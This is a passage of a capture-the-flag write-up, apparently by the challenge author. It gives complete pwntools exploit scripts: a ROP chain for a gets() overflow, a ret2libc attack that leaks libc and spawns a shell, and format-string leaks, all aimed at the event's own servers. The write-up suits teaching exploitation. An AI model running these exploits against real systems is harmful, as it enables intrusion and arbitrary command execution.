+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">vuln</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_2c [</span><span style="color:#ffcc66;">36</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(
+</span><span>      </span><span style="color:#bae67e;">&quot;Howdy! We have a function to read the flag but you aren</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">t allowed to use it.  Can youconvince me otherwise?&quot;
+</span><span>      )</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">gets</span><span>(local_2c)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>gg pwntools rop chain builder really suits my desire to not do work lol.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>log_level </span><span style="color:#f29e74;">= </span><span>logging</span><span style="color:#f29e74;">.</span><span>ERROR
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./chall&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&quot;termite&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;-e&quot;</span><span>]
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;ctf.cybr.club&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2002</span><span>)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>
+</span><span>
+</span><span>    flag_txt </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag.txt&quot;</span><span>))
+</span><span>
+</span><span>    rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(exe)
+</span><span>
+</span><span>    rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">find_file</span><span>(flag_txt)
+</span><span>    rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">unlock_one</span><span>()
+</span><span>    rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">unlock_two</span><span>(</span><span style="color:#ffcc66;">0x12345678</span><span>)
+</span><span>    rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">unlock_three</span><span>(</span><span style="color:#ffcc66;">0x1e9c66e6</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0xadaf1212</span><span>)
+</span><span>    rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read_flag</span><span>()
+</span><span>
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">cyclic</span><span>(</span><span style="color:#ffcc66;">44</span><span>)
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span>rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>()
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>
+</span><span>    </span><span style="color:#f28779;">print</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;(FLAG{.*})&quot;</span><span style="color:#ccc9c2cc;">,</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>flag: <code>FLAG{r37urn_0r13n73d_pr06r4mm1n6_e68a48}</code></p>
+<h2 id="pwn4">pwn4</h2>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ checksec chall
+</span><span>[*] &#39;/home/sky/Documents/binex/rop_ret2libc/chall&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      No PIE (0x400000)
+</span></code></pre>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">vuln</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_28 [</span><span style="color:#ffcc66;">32</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;This binary does nothing; good luck getting the flag now!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* Smashes stack using local_28@0x00401142 (+0,1,40) */
+</span><span>  </span><span style="color:#f28779;">gets</span><span>(local_28)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>Nothing too interesting here in the binary, but we're provided the server libc version which means that we can pretty easily perform a return-to-libc attack.  Since ASLR is enabled on the server we'll need to leak the address libc is loaded into.</p>
+<h3 id="leaking-libc-address">leaking libc address</h3>
+<p>We have control over the return pointer so leaking the libc address is fairly trivial.  What we need to do is leak the address of a symbol in libc and then subtract the offset we know that symbol is inside libc.  What remains is the beginning of libc which is the address that it starts at.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span>pop_rdi </span><span style="color:#f29e74;">= </span><span>(rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">find_gadget</span><span>([</span><span style="color:#bae67e;">&#39;pop rdi&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;ret&#39;</span><span>]))[</span><span style="color:#ffcc66;">0</span><span>]
+</span><span>
+</span><span>payload </span><span style="color:#f29e74;">= </span><span>offset </span><span style="color:#f29e74;">* </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(elf</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;__libc_start_main&#39;</span><span>]) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(elf</span><span style="color:#f29e74;">.</span><span>plt[</span><span style="color:#bae67e;">&#39;puts&#39;</span><span>]) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(elf</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;main&#39;</span><span>])
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>libc_start_address </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">from_bytes</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">byteorder</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;little&quot;</span><span>)
+</span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">= </span><span>libc_start_address </span><span style="color:#f29e74;">- </span><span>libc</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&quot;__libc_start_main&quot;</span><span>]
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;Address of libc </span><span style="color:#ffcc66;">%s </span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">% </span><span style="color:#f28779;">hex</span><span>(libc</span><span style="color:#f29e74;">.</span><span>address))
+</span></code></pre>
+<h3 id="exploiting-with-libc">exploiting with libc</h3>
+<p>Nothing too interesting in this part.  We know the address libc is loaded at which means we know the location of <code>system</code> and the string <code>"/bin/sh"</code> which means we can just set up arguments and then call <code>system</code> to get a shell.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span>binsh </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(libc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/bin/sh&quot;</span><span>))
+</span><span>system </span><span style="color:#f29e74;">= </span><span>libc</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&quot;system&quot;</span><span>]
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;/bin/sh = &quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f28779;">hex</span><span>(binsh))
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;system = &quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">hex</span><span>(system))
+</span><span>
+</span><span>payload </span><span style="color:#f29e74;">= </span><span>offset </span><span style="color:#f29e74;">* </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(binsh) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(system) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(binsh) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(system) </span><span style="font-style:italic;color:#5c6773;"># i uh need to do this twice idk why pls dont ask me why
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span></code></pre>
+<h3 id="putting-it-together">putting it together</h3>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>log_level </span><span style="color:#f29e74;">= </span><span>logging</span><span style="color:#f29e74;">.</span><span>ERROR
+</span><span>
+</span><span>elf </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./chall&quot;</span><span>)
+</span><span>libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span>)
+</span><span>
+</span><span>rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(elf)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>elf
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;/usr/lib/libc.so.6&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>(libc</span><span style="color:#ccc9c2cc;">, </span><span>elf</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">process</span><span>())
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>(libc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;ctf.cybr.club&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2003</span><span>))
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    (libc</span><span style="color:#ccc9c2cc;">, </span><span>p) </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    offset </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">40
+</span><span>
+</span><span>
+</span><span>    pop_rdi </span><span style="color:#f29e74;">= </span><span>(rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">find_gadget</span><span>([</span><span style="color:#bae67e;">&#39;pop rdi&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;ret&#39;</span><span>]))[</span><span style="color:#ffcc66;">0</span><span>]
+</span><span>
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span>offset </span><span style="color:#f29e74;">* </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(elf</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;__libc_start_main&#39;</span><span>]) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(elf</span><span style="color:#f29e74;">.</span><span>plt[</span><span style="color:#bae67e;">&#39;puts&#39;</span><span>]) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(elf</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;main&#39;</span><span>])
+</span><span>
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>    libc_start_address </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">from_bytes</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">byteorder</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;little&quot;</span><span>)
+</span><span>    libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">= </span><span>libc_start_address </span><span style="color:#f29e74;">- </span><span>libc</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&quot;__libc_start_main&quot;</span><span>]
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;Address of libc </span><span style="color:#ffcc66;">%s </span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">% </span><span style="color:#f28779;">hex</span><span>(libc</span><span style="color:#f29e74;">.</span><span>address))
+</span><span>
+</span><span>
+</span><span>    binsh </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(libc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/bin/sh&quot;</span><span>))
+</span><span>    system </span><span style="color:#f29e74;">= </span><span>libc</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&quot;system&quot;</span><span>]
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;/bin/sh = &quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f28779;">hex</span><span>(binsh))
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;system = &quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">hex</span><span>(system))
+</span><span>
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span>offset </span><span style="color:#f29e74;">* </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(binsh) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(system) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(binsh) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(system) </span><span style="font-style:italic;color:#5c6773;"># i uh need to do this twice idk why pls dont ask me
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>
+</span><span>
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat flag.txt;exit&quot;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#f28779;">print</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;(FLAG{.*})&quot;</span><span style="color:#ccc9c2cc;">,</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>(</span><span style="color:#ffcc66;">timeout</span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))
+</span><span>
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>flag: <code>FLAG{r37urn_70_l1bc_227ade}</code></p>
+<h2 id="pwn5">pwn5</h2>
+<p>Because I am dumb (and didn't get these reviewed lol) there is a trivial unintended solution.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ strings chall | grep &quot;FLAG&quot;
+</span><span>FLAG{f0rm47_57r1n6_l34k_69cd8e}
+</span></code></pre>
+<p>Now, i'll go ahead and cover the intended solution anyways.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdio.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdlib.h&gt;
+</span><span>
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main</span><span>(){
+</span><span>	</span><span style="color:#f28779;">setvbuf</span><span>(stdout</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">,</span><span> _IONBF</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> val1 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;not the flag :(&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> val2 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;still not the flag&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> val3 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;i dont think this is right&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> val4 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;doesn&#39;t look like it&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> val5 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;i dont see the flag format&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> val6 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;not quite there yet&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> val7 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;redacted (but this is the flag on the server)&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> val8 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;i think you went too far&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> name </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffcc66;">50</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;*it sounds like this cave is echoing... what do you want to say?*&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">fgets</span><span>(name</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">50</span><span style="color:#ccc9c2cc;">,</span><span> stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(name)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">free</span><span>(name)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>Our input string is used as the first argument to printf which means that this binary is vulnerable to a format string evaluation attack.  The flag is just sitting on the stack which means if we just write a bunch of <code>%s</code> (which interpolates a string) it will eventually leak the flag (or in theory crash if anything on stack isn't a legitimate address but this one doesn't)</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ ./chall
+</span><span>*it sounds like this cave is echoing... what do you want to say?*%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s
+</span><span>s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s
+</span><span>.(null)..%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s
+</span><span>.MEU..%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s
+</span><span>.i think you went too far.FLAG{f0rm47_57r1n6_l34k_69cd8e}.not quite there yet.i dont see the flag format
+</span></code></pre>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./chall&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;18.188.231.247&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2004</span><span>)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;%9$s&quot;</span><span>)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;(FLAG{.*})&quot;</span><span style="color:#ccc9c2cc;">,</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>(</span><span style="color:#bae67e;">&#39;ascii&#39;</span><span>))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))
+</span><span>
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>flag: <code>FLAG{f0rm47_57r1n6_l34k_69cd8e}</code></p>
+<h2 id="pwn6">pwn6</h2>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ checksec chall
+</span><span>[*] &#39;/home/sky/Documents/binex/format_string_write/chall&#39;
+</span><span>    Arch:     i386-32-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      No PIE (0x8048000)
+</span></code></pre>
+<p>Like pwn4 we also get the libc binary that the server is using but the vulnerability is a little different.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  undefined4 uVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined4 uVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined </span><span style="color:#f29e74;">*</span><span>puVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  puVar3 </span><span style="color:#f29e74;">= &amp;</span><span>stack0x00000004</span><span style="color:#ccc9c2cc;">;
+</span><span>  uVar2 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  uVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">;
